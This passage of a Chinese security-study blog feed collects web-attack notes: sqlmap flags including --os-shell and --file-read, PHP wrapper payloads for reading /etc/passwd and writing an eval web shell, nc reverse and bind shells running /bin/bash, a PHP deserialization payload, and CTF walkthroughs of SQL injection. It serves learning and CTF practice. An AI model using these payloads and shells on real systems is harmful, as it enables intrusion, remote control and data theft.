datebase()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<br><span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x5c</span>, (<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>)));<br></code></pre></td></tr></table></figure><h1 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h1><p><a href="https://www.cnblogs.com/bmjoker/p/9326258.html">1. sqlmap超详细笔记+思维导图 - bmjoker - 博客园</a></p><p>测试站点：<a href="http://testphp.vulnweb.com/artists.php?artist=1">http://testphp.vulnweb.com/artists.php?artist=1</a></p><figure class="highlight dsconfig"><table><tr><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-built_in">--current-db</span>   <span class="hljs-comment">#获取当前数据库名</span><br><br><span class="hljs-built_in">--tables</span> -<span class="hljs-string">D</span> <span class="hljs-string">&quot;数据库名&quot;</span>     <span class="hljs-comment">#获取表名</span><br><br><span class="hljs-built_in">--columns</span> -<span class="hljs-string">T</span> <span class="hljs-string">&quot;表名&quot;</span> -<span class="hljs-string">D</span> <span class="hljs-string">&quot;数据库名&quot;</span>    <span class="hljs-comment">#获取列名</span><br><br><span class="hljs-built_in">--dump</span> -<span class="hljs-string">C</span> <span class="hljs-string">&quot;列名&quot;</span> -<span class="hljs-string">T</span> <span class="hljs-string">&quot;表名&quot;</span> -<span class="hljs-string">D</span> <span class="hljs-string">&quot;数据库名&quot;</span>    <span class="hljs-comment">#获取数据</span><br><br></code></pre></td></tr></table></figure><p>MYSQL区分root和非root:</p><figure class="highlight dsconfig"><table><tr><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-comment">#引出权限：</span><br><span class="hljs-built_in">--privileges</span>     <span class="hljs-comment">#查看权限</span><br><span class="hljs-built_in">--is-dba</span>    <span class="hljs-comment">#是否是数据库管理员</span><br><br><span class="hljs-built_in">--sql-shell</span> <span class="hljs-comment">#执行指定sql命令</span><br><br><span class="hljs-comment">#引出文件：</span><br><span class="hljs-built_in">--file-read</span>     <span class="hljs-comment">#读取指定文件</span><br><span class="hljs-built_in">--file-write</span>      <span class="hljs-comment">#写入本地文件</span><br><span class="hljs-built_in">--file-dest</span> <br><br><span class="hljs-comment">#引出命令：</span><br><span class="hljs-built_in">--os-cmd=calc</span>  <span class="hljs-comment">#调出计算器</span><br><span class="hljs-built_in">--os-shell</span> <br><span class="hljs-built_in">--sql-shell</span><br><br><span class="hljs-comment">#提交方法：</span><br><span class="hljs-built_in">--data</span> <span class="hljs-string">&quot;&quot;</span>    <span class="hljs-comment">#表单里POST请求，抓包找数据请求，不推荐</span><br><br><span class="hljs-built_in">--cookie</span> <span class="hljs-string">&quot;&quot;</span>    <span class="hljs-comment">#Cookie，不推荐</span><br><br>-<span class="hljs-string">r</span> <span class="hljs-string">1</span>.<span class="hljs-string">txt</span>    <span class="hljs-comment">#推荐，数据完整性。把请求标头放进文件，但其实文件里不知道注入点，后面加上星号（*）标明注入点</span><br><br></code></pre></td></tr></table></figure><h1 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h1><p><img src="/../images/Pasted%20image%2020241129165616.png"></p><ul><li>文件读取：</li></ul><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/etc/</span>passwd  <span class="hljs-comment"># 绝对路径</span><br><br>php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=phpinfo.php  <span class="hljs-comment"># 相对路径</span><br></code></pre></td></tr></table></figure><ul><li>文件写入：</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/write=convert.base64-encode/resource=phpinfo.php  </span><br>POST data: content=base64的数据<br><span class="hljs-comment"># 需要在代码中有类似file_put_contents($_GET[&#x27;file&#x27;],$_POST[&#x27;content&#x27;])写法</span><br><br>php:<span class="hljs-comment">//input </span><br>POST data:<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;shell.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-string">&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;</span>); <span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><ul><li>代码执行：</li></ul><figure class="highlight php-template"><table><tr><td class="code"><pre><code class="hljs php-template"><span class="language-xml">php://input POST:</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;JS&quot;&gt;&lt;a href=&quot;#JS&quot; class=&quot;headerlink&quot; title=&quot;JS&quot;&gt;&lt;/a&gt;JS&lt;/h1&gt;&lt;p&gt;流行的JS框架有Vue、NodeJS、jQuery、Angular等。&lt;/p&gt;
&lt;p&gt;JS安全问题：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;源码泄漏&lt;/</summary>
      
    
    
    
    
    <category term="网络安全学习笔记" scheme="http://example.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>反弹SHELL</title>
    <link href="http://example.com/2024/11/20/%E5%8F%8D%E5%BC%B9SHELL/"/>
    <id>http://example.com/2024/11/20/%E5%8F%8D%E5%BC%B9SHELL/</id>
    <published>2024-11-20T07:12:05.000Z</published>
    <updated>2024-12-09T08:32:41.643Z</updated>
    
    <content type="html"><![CDATA[<h1 id="正反向代理"><a href="#正反向代理" class="headerlink" title="正反向代理"></a>正反向代理</h1><h2 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a><strong>定义</strong></h3><p>正向代理是一种代理服务器，位于客户端和目标服务器之间，代理客户端向目标服务器发送请求。客户端通过正向代理访问无法直接访问的资源。</p><h3 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a><strong>工作流程</strong></h3><ul><li>客户端 -&gt; 正向代理服务器 -&gt; 目标服务器。</li><li>客户端明确知道自己正在通过代理访问。</li></ul><h3 id="用途"><a href="#用途" class="headerlink" title="用途"></a><strong>用途</strong></h3><ul><li><strong>突破网络限制</strong>：访问被防火墙或地理位置限制的资源（例如翻墙）。</li><li><strong>匿名访问</strong>：隐藏客户端的真实 IP 地址。</li><li><strong>缓存加速</strong>：通过缓存常用资源减少重复请求。</li></ul><h3 id="典型应用场景"><a href="#典型应用场景" class="headerlink" title="典型应用场景"></a><strong>典型应用场景</strong></h3><ul><li>企业内部通过正向代理访问互联网。</li><li>使用 VPN 或 Shadowsocks 等工具突破地理限制。</li></ul><h2 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h2><h3 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h3><p>反向代理是一种代理服务器，位于目标服务器和客户端之间，代理目标服务器向客户端返回资源。客户端的请求通过反向代理访问服务器。</p><h3 id="工作流程-1"><a href="#工作流程-1" class="headerlink" title="工作流程"></a>工作流程</h3><ul><li>客户端 -&gt; 反向代理服务器 -&gt; 后端服务器。</li><li>客户端通常不知道自己访问的是反向代理。</li></ul><h3 id="用途-1"><a href="#用途-1" class="headerlink" title="用途"></a>用途</h3><ul><li><strong>负载均衡</strong>：分发请求到多台后端服务器，减轻单一服务器的压力。</li><li><strong>隐藏服务器信息</strong>：保护后端服务器的 IP 和架构信息。</li><li><strong>缓存与加速</strong>：为静态资源提供缓存，减少后端压力。</li><li><strong>SSL 卸载</strong>：反向代理负责处理 HTTPS 请求，减轻后端服务器的计算负担。</li></ul><h3 id="典型应用场景-1"><a href="#典型应用场景-1" class="headerlink" title="典型应用场景"></a>典型应用场景</h3><ul><li>使用 Nginx 或 Apache 作为反向代理，处理多个后端服务器的请求。</li><li>CDN（内容分发网络）服务，代理请求到最近的缓存服务器或源站。</li><li>Web 应用防火墙（WAF）通过反向代理部署。</li></ul><h1 id="正反向连接"><a href="#正反向连接" class="headerlink" title="正反向连接"></a>正反向连接</h1><h2 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h2><p>客户端主动发起连接到服务器或目标系统。正向连接通常用于客户端-服务器通信，客户端主动请求服务或资源，例如网页浏览、电子邮件发送和接收等。在正向连接中，客户端充当主动方，向服务器发起连接请求，然后服务器接受并处理请求。</p><h3 id="正向shell"><a href="#正向shell" class="headerlink" title="正向shell"></a>正向shell</h3><h3 id="定义-2"><a href="#定义-2" class="headerlink" title="定义"></a>定义</h3><p>正向 Shell 是目标主机主动开放一个端口，监听外部的连接请求（通常由攻击者发起）。攻击者通过连接该端口获得目标系统的命令行访问权限。</p><h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><ol><li>目标主机开启一个监听服务，等待连接请求。</li><li>攻击者主动连接到目标主机的开放端口。</li><li>连接建立后，攻击者可以通过该 Shell 发送命令并与目标主机交互。</li></ol><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ul><li>主动监听：目标主机需要开放一个端口，等待外部连接。</li><li>常见于漏洞利用后：例如在获得目标系统访问权限后，用来建立长期连接。</li><li>依赖网络开放性：如果目标主机被防火墙或 NAT 保护，正向 Shell 的端口可能无法被外部访问。</li></ul><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>在目标主机上执行：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">8888</span> -e /bin/bash<br></code></pre></td></tr></table></figure><ul><li><code>-l</code>: 表示监听模式。</li><li><code>-v</code>: 开启详细输出。</li><li><code>-p</code>: 指定监听的端口（如 8888）。</li><li><code>-e</code>: 指定要执行的程序（这里是 <code>/bin/bash</code>）。</li></ul><p>攻击者在自己的机器上执行：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> 目标IP <span class="hljs-number">8888</span><br></code></pre></td></tr></table></figure><h2 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h2><p>目标系统（通常是受害者）主动建立与控制系统或服务器的连接。反向连接通常用于合法的远程管理和控制，例如远程桌面会话、SSH远程管理等。在反向连接中，目标系统充当客户端，主动连接到远程服务器或控制服务器，以接受命令并将结果返回。</p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><h3 id="定义-3"><a href="#定义-3" class="headerlink" title="定义"></a>定义</h3><p>反弹 Shell 是目标主机主动向攻击者的主机发起连接，将其 Shell 权限回传给攻击者。通常用于目标主机位于防火墙或 NAT 后，无法直接被外部访问时。</p><h3 id="工作原理-1"><a href="#工作原理-1" class="headerlink" title="工作原理"></a>工作原理</h3><ol><li>攻击者在自己的机器上开启一个监听端口。</li><li>目标主机通过一个有效载荷（Payload）主动连接到攻击者的监听端口。</li><li>连接建立后，目标主机的命令行权限被转交给攻击者。</li></ol><h3 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h3><ul><li>绕过防火墙和 NAT：目标主机通过反向连接绕过自身的网络限制。</li><li>攻击者被动监听：攻击者只需要等待目标主机发起连接。</li><li>更常见于实际渗透：尤其是目标系统网络环境受限时。</li></ul><h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h3><p>攻击者在本地机器上执行：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">8888</span><br></code></pre></td></tr></table></figure><p>目标主机上执行： </p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> 攻击者IP <span class="hljs-number">8888</span> -e /bin/bash<br></code></pre></td></tr></table></figure><p>反弹Shell命令一键生成：<a href="https://forum.ywhack.com/shell.php">[~]#棱角 ::Edge.Forum*</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;正反向代理&quot;&gt;&lt;a href=&quot;#正反向代理&quot; class=&quot;headerlink&quot; title=&quot;正反向代理&quot;&gt;&lt;/a&gt;正反向代理&lt;/h1&gt;&lt;h2 id=&quot;正向代理&quot;&gt;&lt;a href=&quot;#正向代理&quot; class=&quot;headerlink&quot; title=&quot;正向代理&quot;</summary>
      
    
    
    
    
    <category term="网络安全学习笔记" scheme="http://example.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化</title>
    <link href="http://example.com/2024/11/15/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://example.com/2024/11/15/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-11-15T07:50:36.000Z</published>
    <updated>2024-12-09T08:33:38.833Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-PHP"><a href="#0x01-PHP" class="headerlink" title="0x01 PHP"></a>0x01 PHP</h1><p>在面向对象的程序设计中，<strong>类</strong>和<strong>对象</strong>是两个非常重要的概念。类是创建对象的基础，包含了对象的结构和功能。对象是类的实例，它拥有类中定义的属性和方法。</p><p>以下是一个PHP类：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestClass</span> //定义一个类</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-comment">//一个变量</span><br><span class="hljs-keyword">public</span> <span class="hljs-variable">$variable</span> = <span class="hljs-string">&#x27;This is a string&#x27;</span>;<br><span class="hljs-comment">//一个方法</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">PrintVariable</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;variable;<br>&#125;<br>&#125;<br><span class="hljs-comment">//创建一个对象</span><br><span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestClass</span>();<br><span class="hljs-comment">//调用一个方法</span><br><span class="hljs-variable">$object</span>-&gt;<span class="hljs-title function_ invoke__">PrintVariable</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>PHP 对属性或方法的访问控制，是通过在前面添加关键字实现的。</p><ul><li>public：公有的类成员可以在任何地方被访问。</li><li>protected：受保护的类成员只能被其自身以及其父类和子类访问。</li><li>private：私有的类成员只能被其定义所在的类访问</li></ul><p>访问控制修饰符不同，序列化后属性的长度和属性值会有所不同，如下所示：</p><ul><li>public：属性值会变成属性名。</li><li>protected：属性值会变成 <code>\x00*\x00属性名</code></li><li>private：属性值会变成 <code>\x00类名\x00属性名</code><br>其中：\x00表示空格。</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">People</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$gender</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$age</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;id = <span class="hljs-string">&#x27;Hardworking666&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;gender = <span class="hljs-string">&#x27;male&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;age = <span class="hljs-string">&#x27;18&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">People</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;People&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;id&quot;</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Hardworking666&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot; * gender&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;male&quot;</span>;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot; People age&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;18&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>PHP中把以两个下划线<code>__</code>开头的方法称为魔术方法，重点关注以下5个魔术方法：</p><ul><li>__ construct：构造函数，当一个对象被创建时调用。</li><li>__ destruct：析构函数，当一个对象被销毁时调用。</li><li>__ toString：当一个对象被当作一个字符串时使用。</li><li>__ sleep：在对象序列化的时候调用。</li><li>__ wakeup：对象重新醒来，即由二进制串重新组成一个对象的时候（在一个对象被反序列化时调用）。</li></ul><p>从序列化到反序列化，这几个函数的执行过程是：<br>__ construct() -&gt;__ sleep() -&gt; __ wakeup() -&gt; __ toString() -&gt; __ destruct()</p><h1 id="0x02-PHP序列化和反序列化"><a href="#0x02-PHP序列化和反序列化" class="headerlink" title="0x02 PHP序列化和反序列化"></a>0x02 PHP序列化和反序列化</h1><p>序列化就是把一个对象变成可以传输的字符串。反序列化就是把那串可以传输的字符串再变回对象。</p><p>以序列化json来举例。有一个数组book:</p><p><img src="/../images/Pasted%20image%2020241115172836.png"></p><p>如果想传输这个数组，就调用json_encode()把这个数组序列化成一串字符串：<br><img src="/../images/Pasted%20image%2020241115173015.png"></p><p>那么，如何把一个对象序列化成一串字符串？举个例子：</p><p><img src="/../images/Pasted%20image%2020241115174639.png"></p><p>这里首先创建了一个类Demo。在实例化时，改变了其属性。PHP对象是存放在内存的堆空间段上的，PHP文件在执行结束的时候会将对象销毁。那么如果之后还要用到这个实例怎么办？解决方法就是先将它序列化存起来。<strong>序列化只序列属性，不序列方法</strong>。</p><p><img src="/../images/Pasted%20image%2020241115175445.png"></p><p>按顺序解释一下输出结果。<br>O: object；<br>4: 类名的长度；<br>2: 2个属性；<br>s:4 : 第一个属性名，是一个字符串string且长度为4；<br>s:3 : 第一个属性对应的值，是一个字符串string且长度为3；<br>s:3 : 第二个属性名，是一个字符串string且长度为3；<br>s:3 : 第二个属性对应的值，是一个字符串string且长度为3。</p><p>用的时候再将其反序列化。<br><img src="/../images/Pasted%20image%2020241115181251.png"></p><h1 id="0x03-实例分析"><a href="#0x03-实例分析" class="headerlink" title="0x03 实例分析"></a>0x03 实例分析</h1><p>序列化和反序列化本身没有问题，但是如果反序列化内容用户可控，且不正当地使用了魔术方法，就会导致安全问题。</p><p>[极客大挑战 2019]PHP<br>index.php：<br><img src="/../images/Pasted%20image%2020241115185130.png"><br>class.php：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;nonono&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;yesyes&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;password != <span class="hljs-number">100</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You name is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;username;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You password is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;password;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;username === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;<br>            <span class="hljs-keyword">die</span>();<br>            <br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>分析代码。由于unserialize()结束时会自动调用__destruct()，所以只要满足username&#x3D;admin且password&#x3D;100，即可得到flag。所以要构造一个username属性是admin且password属性是100的Name对象。</p><p>注意 username 和 password 都是 private 属性，这意味着它们只能在 Name 类的内部访问，外部代码无法直接修改这些属性。因此，尝试通过 $person-&gt;username 和 $person-&gt;password 访问会导致 PHP Fatal error。</p><p>序列化代码如下：<br><img src="/../images/Pasted%20image%2020241115191057.png"></p><p>私有属性名称的前面需加上<code>\0</code>。在URL编码中，<code>\0</code>表示为 <code>%00</code>。</p><p>代码中__wakeup()会将username赋值为guest，所以要想办法绕过该函数。</p><p>当成员属性数目大于实际数目时可以绕过__wakeup()。</p><p>则payload为</p><figure class="highlight perl"><table><tr><td class="code"><pre><code class="hljs perl">?<span class="hljs-keyword">select</span>=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Name&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;<span class="hljs-variable">%0</span>0Name<span class="hljs-variable">%00username</span>&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;<span class="hljs-variable">%0</span>0Name<span class="hljs-variable">%00password</span>&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;100&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-PHP&quot;&gt;&lt;a href=&quot;#0x01-PHP&quot; class=&quot;headerlink&quot; title=&quot;0x01 PHP&quot;&gt;&lt;/a&gt;0x01 PHP&lt;/h1&gt;&lt;p&gt;在面向对象的程序设计中，&lt;strong&gt;类&lt;/strong&gt;和&lt;strong&gt;对象&lt;/str</summary>
      
    
    
    
    
    <category term="WEB" scheme="http://example.com/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF-N1BOOK</title>
    <link href="http://example.com/2024/11/12/BUUCTF-N1BOOK/"/>
    <id>http://example.com/2024/11/12/BUUCTF-N1BOOK/</id>
    <published>2024-11-12T03:36:37.000Z</published>
    <updated>2024-12-09T08:32:53.913Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第一章-web入门-常见的搜集"><a href="#第一章-web入门-常见的搜集" class="headerlink" title="[第一章 web入门]常见的搜集"></a>[第一章 web入门]常见的搜集</h1><p>dirsearch -u <a href="http://74394245-f26a-46d0-92c9-6cead1346fa4.node5.buuoj.cn:81/">http://74394245-f26a-46d0-92c9-6cead1346fa4.node5.buuoj.cn:81/</a></p><p><img src="/../images/Pasted%20image%2020241112113724.png"><br><img src="/../images/Pasted%20image%2020241112113754.png"></p><p>之后没有思路，查看题解发现：</p><p><img src="/../images/Pasted%20image%2020241112114242.png"><br><img src="/../images/Pasted%20image%2020241112115633.png"></p><p>flag1:n1book{info_1   flag2:s_v3ry_im   flag3:p0rtant_hack}</p><h1 id="第一章-web入门-粗心的小李"><a href="#第一章-web入门-粗心的小李" class="headerlink" title="[第一章 web入门]粗心的小李"></a>[第一章 web入门]粗心的小李</h1><p><img src="/../images/Pasted%20image%2020241112115853.png"></p><p>githacker –url <a href="http://83d9dee3-3f90-4977-9cc5-99d26b130a8b.node5.buuoj.cn:81/.git">http://83d9dee3-3f90-4977-9cc5-99d26b130a8b.node5.buuoj.cn:81/.git</a> –output-folder git</p><p>在githacker文件夹目录下会生成index.html，得到flag</p><h1 id="第一章-web入门-SQL注入-有回显"><a href="#第一章-web入门-SQL注入-有回显" class="headerlink" title="[第一章 web入门]SQL注入-有回显"></a>[第一章 web入门]SQL注入-有回显</h1><ol><li>判断注入方式：id&#x3D;2-1和id&#x3D;1回显不同，证明是字符型注入。</li><li>判断闭合方式：id&#x3D;1’无回显，id&#x3D;1”有回显，证明闭合方式是单引号。</li><li>判断字段数：id&#x3D;1’ order by 3– - 有回显，id&#x3D;1’ order by 4– -无回显，证明有3个字段。注意这里用#注释无效，需用– -</li><li>获取数据库名：id&#x3D;-1’ union select 1,database(),3 – -，注意要让第一条数据不显示。</li><li>获取表名：id&#x3D;-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’note’– -，显示fl4g,notes。或者直接table_schema&#x3D;database()。</li><li>获取列名：id&#x3D;-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’fl4g’ and table_schema&#x3D;’note’ – -，显示fllllag。</li><li>获取flag: id&#x3D;-1’ union select 1,2, fllllag from fl4g– -，显示n1book{union_select_is_so_cool}。</li></ol><h1 id="第一章-web入门-SQL注入-无回显"><a href="#第一章-web入门-SQL注入-无回显" class="headerlink" title="[第一章 web入门]SQL注入-无回显"></a>[第一章 web入门]SQL注入-无回显</h1><p><img src="/../images/Pasted%20image%2020241112160628.png"></p><p><img src="/../images/Pasted%20image%2020241112160843.png"></p><p>报错信息是一串unicode编码。<br><img src="/../images/Pasted%20image%2020241112161433.png"><br>账号名改成admin，报错信息解码后为：账号或密码错误。证明这是字符型注入。</p><p>接下来判断闭合方式，发现是单引号。pass的值不重要，注入时会被注释掉。<br><img src="/../images/Pasted%20image%2020241112161809.png"></p><p>由于开启了mysql的错误提示，报错会进行回显，于是使用报错注入：</p><ol><li><p>获取数据库名：name&#x3D;admin’ and updatexml(1,concat(0x7e,database()),1)#&amp;pass&#x3D;1<br><img src="/../images/Pasted%20image%2020241112165437.png"></p></li><li><p>获取表名：name&#x3D;admin’ and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’note’)),1)#&amp;pass&#x3D;1<br><img src="/../images/Pasted%20image%2020241112170220.png"></p></li></ol><p>由于不展示select到的值，判断select被过滤。根据mysql对大小写不敏感，从而使用大小写绕过，sElect代替select。<br><img src="/../images/Pasted%20image%2020241112170436.png"></p><ol start="3"><li><p>获取列名：name&#x3D;admin’ and updatexml(1,concat(0x7e,(sElect group_concat(column_name) from information_schema.columns where table_name&#x3D;’fl4g’ and table_schema&#x3D;’note’)),1)#&amp;pass&#x3D;1<br><img src="/../images/Pasted%20image%2020241112170819.png"></p></li><li><p>获取flag: name&#x3D;admin’ and updatexml(1,concat(0x7e,(sElect flag from fl4g)),1)#&amp;pass&#x3D;1<br><img src="/../images/Pasted%20image%2020241112171015.png"></p></li></ol><blockquote><p>[!NOTE] 